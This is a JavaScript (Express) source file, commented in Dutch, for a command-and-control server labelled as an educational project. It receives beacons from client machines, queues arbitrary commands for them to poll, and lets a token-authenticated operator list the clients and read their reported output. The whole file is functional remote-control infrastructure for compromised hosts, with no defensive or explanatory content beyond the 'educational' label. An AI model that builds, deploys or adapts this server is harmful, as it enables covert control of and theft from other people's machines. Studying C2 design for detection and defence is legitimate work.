// server.js - Render.com C2 Server
// Educational Cybersecurity Project

const express = require('express');
const cors = require('cors');
const app = express();

// Configuratie
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "YOUR_SECRET_TOKEN_HERE";
const PORT = process.env.PORT || 3000;

// In-memory storage (voor Render free tier)
// Voor productie: gebruik PostgreSQL of Redis
const storage = {
  beacons: new Map(),
  commands: new Map()
};

// Middleware
app.use(cors());
app.use(express.json());

// Cleanup oude data (elke 10 minuten)
setInterval(() => {
  const now = Date.now();
  const expiration = 3600 * 1000; // 1 uur
  
  for (const [key, value] of storage.beacons.entries()) {
    if (now - value.lastSeen > expiration) {
      storage.beacons.delete(key);
      console.log(`Cleaned up expired beacon: ${key}`);
    }
  }
  
  // Cleanup oude commands (5 minuten)
  const cmdExpiration = 300 * 1000;
  for (const [key, value] of storage.commands.entries()) {
    if (now - value.timestamp > cmdExpiration) {
      storage.commands.delete(key);
      console.log(`Cleaned up expired command: ${key}`);
    }
  }
}, 10 * 60 * 1000);

// Route: Health check
app.get('/', (req, res) => {
  res.json({ 
    status: 'C2 Server Active',
    timestamp: new Date().toISOString(),
    activeClients: storage.beacons.size
  });
});

// Route: Beacon ontvangen van client
app.post('/beacon', async (req, res) => {
  try {
    const data = req.body;
    const clientId = data.hostname || 'unknown';
    
    // Sla beacon data op
    storage.beacons.set(clientId, {
      ...data,
      lastSeen: Date.now()
    });
    
    console.log(`[BEACON] ${clientId}:`, JSON.stringify(data.data || {}));
    
    res.json({ status: 'ok' });
  } catch (error) {
    console.error('[ERROR] Beacon processing failed:', error);
    res.status(500).json({ error: error.message });
  }
});

// Route: Client pollt voor commands
app.get('/command', async (req, res) => {
  try {
    const clientId = req.query.id || 'unknown';
    
    // Haal command op voor deze client
    const commandData = storage.commands.get(clientId);
    
    if (commandData) {
      // Command gevonden, stuur en verwijder
      storage.commands.delete(clientId);
      console.log(`[COMMAND] Sent to ${clientId}: ${commandData.command}`);
      
      res.json({ command: commandData.command });
    } else {
      // Geen command beschikbaar
      res.json({ command: null });
    }
  } catch (error) {
    console.error('[ERROR] Command retrieval failed:', error);
    res.status(500).json({ error: error.message });
  }
});

// Middleware: Admin authenticatie
function requireAuth(req, res, next) {
  const token = req.headers.authorization;
  
  if (token !== `Bearer ${ADMIN_TOKEN}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  next();
}

// Route: Admin - lijst actieve clients
app.get('/admin/clients', requireAuth, async (req, res) => {
  try {
    const clients = Array.from(storage.beacons.values());
    
    res.json({ 
      clients,
      count: clients.length,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('[ERROR] Client list failed:', error);
    res.status(500).json({ error: error.message });
  }
});

// Route: Admin - stuur command naar client
app.post('/admin/command', requireAuth, async (req, res) => {
  try {
    const { clientId, command } = req.body;
    
    if (!clientId || !command) {
      return res.status(400).json({ error: 'Missing clientId or command' });
    }
    
    // Sla command op voor client
    storage.commands.set(clientId, {
      command,
      timestamp: Date.now()
    });
    
    console.log(`[ADMIN] Command queued for ${clientId}: ${command}`);
    
    res.json({ 
      status: 'ok',
      message: `Command queued for ${clientId}`
    });
  } catch (error) {
    console.error('[ERROR] Command queue failed:', error);
    res.status(500).json({ error: error.message });
  }
});

// Route: Admin - haal outputs op
app.get('/admin/output', requireAuth, async (req, res) => {
  try {
    const clientId = req.query.id;
    
    if (!clientId) {
      return res.status(400).json({ error: 'Missing client id' });
    }
    
    const data = storage.beacons.get(clientId);
    
    if (data) {
      res.json(data);
    } else {
      res.status(404).json({ error: 'Client not found' });
    }
  } catch (error) {
    console.error('[ERROR] Output retrieval failed:', error);
    res.status(500).json({ error: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════╗
║     C2 SERVER - EDUCATIONAL PROJECT      ║
║     Running on port ${PORT}                ║
╚═══════════════════════════════════════════╝
  `);
  console.log(`Server URL: http://localhost:${PORT}`);
  console.log(`Admin Token: ${ADMIN_TOKEN}`);
});
